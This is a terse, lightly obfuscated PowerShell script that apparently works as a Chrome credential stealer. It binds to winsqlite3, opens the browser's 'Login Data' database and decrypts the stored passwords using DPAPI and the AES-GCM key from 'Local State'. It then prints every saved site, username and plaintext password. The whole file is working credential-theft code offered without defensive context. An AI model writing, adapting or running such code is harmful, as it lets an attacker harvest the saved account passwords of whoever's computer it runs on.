$d=Add-Type -A System.Security
$p='public static'
$g=""")]$p extern"
$i='[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m="[MarshalAs(UnmanagedType.LP"
$q='(s,i)'
$f='(p s,int i)'
$z=$env:LOCALAPPDATA+'\Google\Chrome\User Data'
$u=[Security.Cryptography.ProtectedData]
$n=$x=$null
Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
$s=[W]::O("$z\\Default\\Login Data",[ref]$d)
if((get-host).Version.Major -eq 7){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
$x=[Security.Cryptography.AesGcm]::New($u::Unprotect([System.Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))
    write-host $x
}
$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
for(;!([W]::S($s)%100)){$a=[W]::T($s,0)
$b=[W]::T($s,3)
$c=[W]::B($s,5)
try{$a,$b,(($u::Unprotect($c,$n,0)|%{[char]$_})-join'')
continue}catch{}if($x -ne $null){$t=$c[15..($c.length-17)]
$e=[byte[]]::new($t.length)
$x.Decrypt($c[3..14],$t,$c[($c.length-16)..($c.length-1)],$e)
$a,$b,(($e|%{[char]$_})-join'')}}